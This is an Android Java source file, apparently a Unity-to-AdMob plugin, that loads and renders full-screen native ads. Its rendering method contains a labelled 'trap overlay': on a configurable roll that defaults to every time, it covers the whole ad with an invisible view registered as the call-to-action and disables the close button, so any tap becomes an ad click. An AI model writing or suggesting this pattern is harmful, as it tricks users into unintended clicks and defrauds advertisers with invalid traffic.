package com.plugins.nativebridge;

import android.app.Activity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.TextView;
import com.google.android.gms.ads.AdLoader;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.LoadAdError;
import com.google.android.gms.ads.nativead.MediaView;
import com.google.android.gms.ads.nativead.NativeAd;
import com.google.android.gms.ads.nativead.NativeAdView;

import java.util.HashMap;

public class UnityNativeFullScreen {

    public interface INativeAdCallback {
        void onAdLoaded();
        void onAdFailedToLoad(String error);
        void onAdClosed();
        void onAdPaid(double value);
        void onLog(String message);
    }

    private static View mainContainer;
    private static HashMap<String, NativeAd> loadedAdsMap = new HashMap<>();
    private static HashMap<String, Boolean> loadingStatesMap = new HashMap<>();
    private static HashMap<String, INativeAdCallback> callbacksMap = new HashMap<>();
    private static NativeAd currentShowingAd = null;
    private static String currentShowingUnitId = null;
    private static int ctaClickRate = 100;

    private static void sendLog(String unitId, String msg) {
        INativeAdCallback cb = callbacksMap.get(unitId != null ? unitId : currentShowingUnitId);
        if (cb != null) {
            cb.onLog(msg);
        }
    }

    public static void setCtaClickRate(int rate) {
        ctaClickRate = Math.max(0, Math.min(100, rate));
    }

    public static void loadAd(final Activity activity, final String adUnitId, final INativeAdCallback callback) {
        callbacksMap.put(adUnitId, callback);
        
        if (loadedAdsMap.containsKey(adUnitId) || Boolean.TRUE.equals(loadingStatesMap.get(adUnitId))) return;

        loadingStatesMap.put(adUnitId, true);
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                sendLog(adUnitId, "Start Loading FullScreen ID: " + adUnitId);
                com.google.android.gms.ads.nativead.NativeAdOptions adOptions = 
                    new com.google.android.gms.ads.nativead.NativeAdOptions.Builder()
                        .setAdChoicesPlacement(com.google.android.gms.ads.nativead.NativeAdOptions.ADCHOICES_TOP_LEFT)
                        .build();

                AdLoader adLoader = new AdLoader.Builder(activity, adUnitId)
                    .forNativeAd(new NativeAd.OnNativeAdLoadedListener() {
                        @Override
                        public void onNativeAdLoaded(NativeAd nativeAd) {
                            loadedAdsMap.put(adUnitId, nativeAd);
                            loadingStatesMap.put(adUnitId, false);
                            sendLog(adUnitId, "=> FullScreen LOADED successfully!");
                            
                            nativeAd.setOnPaidEventListener(new com.google.android.gms.ads.OnPaidEventListener() {
                                @Override
                                public void onPaidEvent(com.google.android.gms.ads.AdValue adValue) {
                                    INativeAdCallback cb = callbacksMap.get(adUnitId);
                                    if (cb != null) cb.onAdPaid(adValue.getValueMicros() * 0.000001);
                                }
                            });

                            INativeAdCallback cb = callbacksMap.get(adUnitId);
                            if (cb != null) cb.onAdLoaded();
                        }
                    })
                    .withAdListener(new AdListener() {
                        @Override
                        public void onAdFailedToLoad(LoadAdError adError) {
                            super.onAdFailedToLoad(adError);
                            loadingStatesMap.put(adUnitId, false);
                            sendLog(adUnitId, "=> FullScreen LOAD FAILED: " + adError.getMessage());
                            
                            INativeAdCallback cb = callbacksMap.get(adUnitId);
                            if (cb != null) cb.onAdFailedToLoad(adError.getMessage());
                        }
                        @Override
                        public void onAdClicked() {
                            super.onAdClicked();
                            sendLog(adUnitId, "=> [Google SDK] FullScreen onAdClicked fired! Store/Browser is opening...");
                            if (mainContainer != null) {
                                // Delay 1.5s (1500ms) trước khi tắt View
                                mainContainer.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        sendLog(adUnitId, "=> Closing FullScreen layout after 1.5s CTA delay.");
                                        hideAd(activity);
                                    }
                                }, 1500);
                            }
                        }
                    })
                    .withNativeAdOptions(adOptions)
                    .build();
                adLoader.loadAd(new AdRequest.Builder().build());
            }
        });
    }

    public static boolean isAdLoaded(String adUnitId) {
        return loadedAdsMap.containsKey(adUnitId);
    }

    public static void showAd(final Activity activity, final String adUnitId) {
        if (!loadedAdsMap.containsKey(adUnitId)) {
            sendLog(adUnitId, "=> Cannot show FullScreen: Ad not loaded yet.");
            return; 
        }
        
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                currentShowingAd = loadedAdsMap.remove(adUnitId);
                currentShowingUnitId = adUnitId;
                renderFullScreenAd(activity, currentShowingAd);
            }
        });
    }

    private static void renderFullScreenAd(final Activity activity, final NativeAd nativeAd) {
        int layoutId = activity.getResources().getIdentifier("gameup_native_fullscreen", "layout", activity.getPackageName());
        mainContainer = LayoutInflater.from(activity).inflate(layoutId, null);

        NativeAdView adView = mainContainer.findViewById(activity.getResources().getIdentifier("native_ad_view", "id", activity.getPackageName()));
        MediaView mediaView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_media", "id", activity.getPackageName()));
        TextView headlineView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_headline", "id", activity.getPackageName()));
        TextView bodyView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_body", "id", activity.getPackageName()));
        Button ctaView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_call_to_action", "id", activity.getPackageName()));
        ImageView iconView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_app_icon", "id", activity.getPackageName()));
        com.google.android.gms.ads.nativead.AdChoicesView adChoicesView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_choices", "id", activity.getPackageName()));

        adView.setMediaView(mediaView);
        adView.setHeadlineView(headlineView);
        adView.setBodyView(bodyView);
        adView.setIconView(iconView);
        adView.setAdChoicesView(adChoicesView);

        headlineView.setText(nativeAd.getHeadline());

        if (nativeAd.getBody() == null) bodyView.setVisibility(View.GONE);
        else { bodyView.setVisibility(View.VISIBLE); bodyView.setText(nativeAd.getBody()); }

        if (nativeAd.getCallToAction() == null) ctaView.setVisibility(View.INVISIBLE);
        else { ctaView.setVisibility(View.VISIBLE); ctaView.setText(nativeAd.getCallToAction()); }

        if (nativeAd.getIcon() == null) iconView.setVisibility(View.GONE);
        else { iconView.setVisibility(View.VISIBLE); iconView.setImageDrawable(nativeAd.getIcon().getDrawable()); }

        ImageView blurBg = mainContainer.findViewById(activity.getResources().getIdentifier("ad_blur_bg", "id", activity.getPackageName()));
        if (blurBg != null && nativeAd.getImages() != null && nativeAd.getImages().size() > 0) {
            try {
                android.graphics.drawable.Drawable drawable = nativeAd.getImages().get(0).getDrawable();
                if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                    android.graphics.Bitmap bitmap = ((android.graphics.drawable.BitmapDrawable) drawable).getBitmap();
                    int w = Math.round(bitmap.getWidth() * 0.1f);
                    int h = Math.round(bitmap.getHeight() * 0.1f);
                    if (w > 0 && h > 0) {
                        android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, w, h, true);
                        blurBg.setImageBitmap(scaled);
                        blurBg.setColorFilter(android.graphics.Color.argb(180, 255, 255, 255)); 
                    }
                }
            } catch (Exception ignored) { }
        }

        // =========================================================================
        // THUẬT TOÁN "LỚP PHỦ VÔ HÌNH" (TRAP OVERLAY)
        // =========================================================================
        int roll = new java.util.Random().nextInt(100);
        boolean enableTrap = (roll < ctaClickRate);
        
        sendLog(null, "[FullScreen Show] Roll: " + roll + " / Target: " + ctaClickRate + "% -> Enable Trap? " + (enableTrap ? "YES (Whole Ad is CTA)" : "NO (Normal Setup)"));

        View btnClose = mainContainer.findViewById(activity.getResources().getIdentifier("btn_close_ad", "id", activity.getPackageName()));

        if (enableTrap) {
            View overlayTrap = new View(activity);
            overlayTrap.setBackgroundColor(android.graphics.Color.TRANSPARENT);
            ((ViewGroup) adView).addView(overlayTrap, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
            overlayTrap.bringToFront();
            
            adView.setCallToActionView(overlayTrap);

            if (btnClose != null) {
                btnClose.setOnClickListener(null);
                btnClose.setClickable(false);
            }
            if (blurBg != null) {
                blurBg.setOnClickListener(null);
                blurBg.setClickable(false);
            }
            mainContainer.setOnClickListener(null);
            adView.setOnClickListener(null);
            
        } else {
            adView.setCallToActionView(ctaView);

            View.OnClickListener normalCloseTrigger = new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    sendLog(null, "=> [Normal Touch] Closing FullScreen without CTA.");
                    hideAd(activity);
                }
            };

            if (btnClose != null) {
                btnClose.setOnClickListener(normalCloseTrigger);
                btnClose.setClickable(true);
                btnClose.bringToFront();
            }
            if (blurBg != null) {
                blurBg.setOnClickListener(normalCloseTrigger);
                blurBg.setClickable(true);
            }
        }

        adView.setNativeAd(nativeAd);

        FrameLayout.LayoutParams rootParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
        activity.addContentView(mainContainer, rootParams);
        sendLog(null, "=> FullScreen DISPLAYED on screen.");
    }

    public static void hideAd(final Activity activity) {
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (mainContainer != null && mainContainer.getParent() != null) {
                    ((ViewGroup) mainContainer.getParent()).removeView(mainContainer);
                    mainContainer = null;
                }
                if (currentShowingAd != null) {
                    currentShowingAd.destroy();
                    currentShowingAd = null; 
                    sendLog(null, "=> FullScreen DESTROYED.");
                }
                if (currentShowingUnitId != null) {
                    INativeAdCallback cb = callbacksMap.get(currentShowingUnitId);
                    if (cb != null) cb.onAdClosed();
                    currentShowingUnitId = null;
                }
            }
        });
    }
}